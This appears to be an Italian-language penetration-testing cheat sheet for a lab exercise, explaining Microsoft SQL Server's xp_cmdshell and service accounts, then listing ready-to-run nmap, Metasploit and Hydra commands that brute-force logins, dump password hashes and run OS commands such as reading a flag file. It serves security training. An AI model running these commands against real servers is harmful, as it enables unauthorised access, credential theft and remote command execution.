Microsoft SQL ( MSSQL) è il sistema di gestione di database relazionali basato su SQL di Microsoft. A differenza di MySQL, di cui abbiamo parlato nell'ultima sezione, MSSQL è closed source ed è stato inizialmente scritto per essere eseguito sui sistemi operativi Windows. È popolare tra gli amministratori di database e gli sviluppatori quando creano applicazioni eseguite su .NET framework di Microsoft grazie al suo forte supporto nativo per .NET. Esistono versioni di MSSQL che verranno eseguite su Linux e MacOS, ma è più probabile che incontreremo istanze MSSQL su target che eseguono Windows.

E' possibile creare funzioni da poter eseguire.
Supporta stored procedure come xp-cmdshell, che consentono di eseguire comandi del sistema operativo Widnows direttamente dal database.
Il processo generato da xp_cmdshell ha gli stessi diritti di sicurezza dell'account di servizio SQL server.
Quando chiamato da un utente che non è membro del ruolo predefinito del server sysadmin, xp_cmdshell si connette a Windows usando un account proxy specificato nelle credenziali denominate `##xp_cmdshell_proxy_account`


Account di Servizio vs Account Membro:
Account di Servizio:
Ogni servizio in SQL Server rappresenta un processo o un set di processi che gestiscono l’autenticazione delle operazioni di SQL Server con Windows.
Gli account di servizio sono utilizzati per eseguire questi processi.
Esempi di servizi:
Servizi di database di SQL Server: Motore di database relazionale di SQL Server.
SID del servizio, se supportato.
Un account del servizio gestito è un tipo di account di dominio creato e gestito dal controller di dominio. Viene assegnato al computer di un singolo membro per l’esecuzione di un servizio e la password viene gestita automaticamente dal controller di dominio1.


Account Membro:
L’account di avvio del servizio SQL Server Agent definisce l’account di Windows con cui viene eseguito SQL Server Agent e le relative autorizzazioni di rete.
Per la corretta esecuzione delle funzioni, è necessario che SQL Server Agent sia configurato per usare le credenziali di un account membro del ruolo predefinito del server sysadmin in SQL Server.
L’account deve disporre delle autorizzazioni di Windows seguenti:
Accedere come servizio (SeServiceLogonRight)2.
È possibile impostare l’account del servizio SQL Server Agent con Gestione configurazione SQL Server in SQL Server usando SQL Server Management Studio23.

```
MSSQL DB Default:
# master: 
Tiene traccia di tutte le informazioni di sistema per un'istanza del server SQL.  
  
# model: 
Database modello che funge da struttura per ogni nuovo database creato. Qualsiasi impostazione modificata nel database modello si rifletterà in qualsiasi nuovo database creato dopo le modifiche al database modello.
  
# msdb:
SQL Server Agent utilizza questo database per pianificare processi e avvisi. 
  
# tempdb:
Memorizza oggetti temporanei.
  
# Resource:
Database di sola lettura contenente oggetti di sistema inclusi con SQL Server
```



##### Nmap script mssql

```
## Nmap script mssql
Info:
> nmap --script ms-sql-info -p1433 10.4.21.27

Ntlm Info:
> nmap --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 -p1433 10.4.21.27

Bruteforce enumerate users and passwords:
> nmap --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt -p1433 10.4.21.27

Check empty password users:
> nmap --script ms-sql-empty-password -p1433 10.4.21.27

Dump MSSQL users hashes:
> nmap --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria -p1433 10.4.21.27

CMD shell:
> nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig" -p1433 10.4.21.27

CMD shell:
> nmap --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt" -p1433 10.4.21.27
```


### Metasploit
```
Metasploit - Enum:
nmap --script ms-sql-info -p1433 10.4.23.176
msfconsole
use auxiliary/scanner/mssql/mssql_login
set USER_FILE /root/Desktop/wordlist/common_users.txt
set PASS_FILE /root/Desktop/wordlist/100-common-passwords.txt
exploit

Metasploit - Enum:
> use auxiliary/admin/mssql/mssql_enum
set RHOSTS 10.4.23.176
exploit

Metasploit - Logins: 
> use auxiliary/admin/mssql/mssql_enum_sql_logins
set RHOSTS 10.4.23.176
exploit

Metasploit - CMD command:
> use auxiliary/admin/mssql/mssql_exec
set RHOSTS 10.4.23.176
set CMD whoami
exploit

Metasploit - Enum Domain Accounts:
use auxiliary/admin/mssql/mssql_enum_domain_accounts
set RHOSTS 10.4.23.176
exploit
```


##### Hydra
```
> hydra -l root -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.222.16.3 mssql
```
